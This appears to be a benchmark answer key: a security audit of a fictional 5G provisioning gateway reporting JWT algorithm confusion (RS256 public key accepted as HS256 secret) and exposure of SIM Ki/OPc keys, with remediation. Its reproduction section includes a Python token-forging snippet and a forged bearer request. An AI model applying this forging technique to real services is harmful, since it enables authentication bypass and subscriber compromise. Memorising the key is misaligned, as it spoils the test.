# Expected Response

## System
- **Name:** OmniCell 5G Provisioning Gateway
- **Domain:** Telecommunications / 5G Core Network / BSS & OSS
- **Document version analysed:** 3.9.2 (FINAL) + implementation doc 4.5.1

---

## Priority Findings

### Finding 1 — JWT Algorithm Confusion: RS256 Public Key Used as HS256 HMAC Secret (Pattern 10.2 — JWT algorithm confusion attack)
**Severity:** Critical / Identity Forgery / Auth Bypass
**Affected endpoint:** All endpoints protected by `verifyFieldTech` middleware, specifically `GET /api/v3/subscribers/{iccid}/diagnostics`
**Referenced in context:** Section 4.0 (Pattern 10.2), Section 6.0 (authMiddleware.js), HAR trace JWT header

**Summary:**
The Node.js JWT middleware (`authMiddleware.js`, Section 6.0) calls `jwt.verify(token, publicKey)` without specifying an algorithm allowlist:
```javascript
// Developer FAILS to include: { algorithms: ['RS256'] }
const decoded = jwt.verify(token, publicKey);
```
When the `jsonwebtoken` library receives a token with `"alg": "HS256"` in its header, it interprets the `publicKey` PEM string as a symmetric HMAC secret rather than an RSA public key. The attacker downloads the public key from the open JWKS endpoint (`https://auth.omnicell.network/.well-known/jwks.json`), crafts a JWT payload with `"role": "FIELD_TECH"`, sets the header to `{"alg": "HS256"}`, and signs the token using the RSA public key bytes as the HMAC secret. Because the public key is public knowledge, the attacker can sign arbitrary payloads that pass server-side verification.

**Evidence from HAR — JWT header decode:**
- JWT first segment from HAR: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
- Decoded: `{"alg":"HS256","typ":"JWT"}` — the attacker forced HS256, not the expected RS256
- JWT second segment: `eyJzdWIiOiJhdHRhY2tlcl85OSIsInJvbGUiOiJGSUVMRF9URUNIIiwiaWF0IjoxNzgxMDIxNTAwfQ`
- Decoded: `{"sub":"attacker_99","role":"FIELD_TECH","iat":1781021500}` — the attacker injected `role: FIELD_TECH`
- Response: `200 OK` — the forged token was accepted by the middleware

---

### Finding 2 — Excessive Data Exposure: SIM Cryptographic Master Keys Returned in Diagnostic Response (Pattern 3.1 — Excessive data exposure)
**Severity:** Critical / SIM Cloning / Subscriber Identity Compromise
**Affected endpoint:** `GET https://api.omnicell.network/api/v3/subscribers/89103000000012345678/diagnostics`
**Referenced in context:** Section 4.0 (Pattern 3.1 / RISK-TEL-102), Section 6.0 (diagnosticsController.js), Section 5.0 (UDM schema), HAR response body

**Summary:**
The diagnostics controller (Section 6.0) executes `SELECT * FROM sim_profiles WHERE iccid = $1`. The `sim_profiles` table (Section 5.0) stores both diagnostic telemetry (`rsrp_signal_strength`, `last_attached_cell_id`) and cryptographic master keys (`auth_key_ki`, `opc_key`) in the same row. The schema comment explicitly states: *"These must NEVER leave the secure enclave or be exposed to the IT layer."*

The entire database row is serialized to the HTTP response with no column filtering. The frontend technician app only displays the diagnostic fields in the UI, but the full HTTP response carries all columns — available to any raw HTTP client that bypasses the UI.

**Evidence from HAR response body:**
- `auth_key_ki: "7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D"` — 128-bit SIM Authentication Key
- `opc_key: "1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D"` — 128-bit Operator Variant Algorithm Configuration Field
- `imsi: "310410123456789"` — International Mobile Subscriber Identity (also sensitive)
- `msisdn: "15558675309"` — subscriber phone number
- Response header: `x-udm-latency-ms: 89` — confirms the query reached the internal UDM core network

---

## Evidence Map

| Artifact location | Finding 1 (JWT Alg Confusion) | Finding 2 (Excessive Data Exposure) |
|---|---|---|
| Section 4.0 | Pattern 10.2 — algorithm not locked to RS256 | Pattern 3.1 / RISK-TEL-102 — SELECT * returned to client |
| Section 6.0 authMiddleware.js | `jwt.verify(token, publicKey)` without algorithm option | — |
| Section 6.0 diagnosticsController.js | — | `SELECT *` query; `res.status(200).json(result.rows[0])` |
| Section 5.0 UDM schema | — | `auth_key_ki` and `opc_key` in same table as diagnostic fields; comment "NEVER leave secure enclave" |
| HAR JWT first segment | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → `alg: HS256` (not RS256) | — |
| HAR JWT second segment | `role: FIELD_TECH` injected | — |
| HAR response body | `200 OK` — forged token accepted | `auth_key_ki` and `opc_key` exposed |
| HAR x-udm-latency-ms | — | `89` — confirms UDM core was queried |

---

## Steps to Reproduce

### Finding 1 — JWT Algorithm Confusion

**Step 1 — Fetch the public key from the open JWKS endpoint**
```
GET https://auth.omnicell.network/.well-known/jwks.json
```
Extract the RSA public key material from the `keys` array. Convert to PEM format if needed.

**Step 2 — Forge a FIELD_TECH JWT with HS256**
Using any JWT library or jwt.io, create a token with:
- Header: `{"alg": "HS256", "typ": "JWT"}`
- Payload: `{"sub": "attacker_99", "role": "FIELD_TECH", "iat": <current timestamp>}`
- Sign with the RSA public key bytes as the HMAC-SHA256 secret

Example (Python):
```python
import jwt
import requests

jwks = requests.get("https://auth.omnicell.network/.well-known/jwks.json").json()
# Convert JWKS to PEM (use python-jose or similar)
public_key_pem = convert_jwks_to_pem(jwks['keys'][0])

forged_token = jwt.encode(
    {"sub": "attacker_99", "role": "FIELD_TECH", "iat": 1781021500},
    public_key_pem,
    algorithm="HS256"
)
```

**Step 3 — Request diagnostics with forged token (exact HAR replay)**
```
GET https://api.omnicell.network/api/v3/subscribers/89103000000012345678/diagnostics
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlcl85OSIsInJvbGUiOiJGSUVMRF9URUNIIiwiaWF0IjoxNzgxMDIxNTAwfQ.XyZ_Forged_HMAC_Signature_Using_Public_Key_String...
Accept: application/json
User-Agent: OmniCell-TechDiag/2.1.0 (Android 14)
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `200 OK`
- Response body contains `auth_key_ki: "7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D"` and `opc_key: "1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D"`
- Response header: `x-udm-latency-ms: 89` — UDM core was queried

**Secure outcome:**
- `403 Forbidden` — `{"error": "Invalid token signature"}` — the middleware would reject the HS256 token when algorithm is locked to `RS256` via `{ algorithms: ['RS256'] }`

### Finding 2 — Verify Excessive Data Exposure

In the HAR response body, verify the presence of the following fields that should **not** be in a diagnostic API response:
1. `auth_key_ki` — 32-character hex string (`7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D`) — cryptographic SIM root key
2. `opc_key` — 32-character hex string (`1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D`) — cryptographic SIM root key
3. `imsi` — 15-digit subscriber identity (`310410123456789`)
4. `msisdn` — subscriber phone number (`15558675309`)

Compare against the intended safe response (Section 7.1) which should contain only: `iccid`, `status`, `last_attached_cell_id`, `rsrp_signal_strength`. Any additional fields beyond these four confirm the excessive data exposure vulnerability.

---

## Remediation

**Finding 1 (JWT Algorithm Confusion):**
1. Lock the algorithm in `jwt.verify`: `const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. This is a single-line fix that causes the library to reject any token presenting `alg: HS256`.
2. Validate that the JWKS endpoint returns only RSA/EC key types — reject symmetric key tokens at the Kong Gateway level as well.

**Finding 2 (Excessive Data Exposure):**
1. Replace `SELECT *` with an explicit column list: `SELECT iccid, status, last_attached_cell_id, rsrp_signal_strength FROM sim_profiles WHERE iccid = $1`.
2. Never store cryptographic root keys (`Ki`, `OPc`) in the same database accessible to the IT-layer microservices. These should remain in the UDM secure enclave and never be transmitted over the API surface at all, as stated in Section 5.0 schema comment.
3. Add a column allowlist in the API response serializer — if any response accidentally includes fields matching `*_ki`, `*_key`, `*_secret`, or `*_credential`, fail the request and generate a security alert.
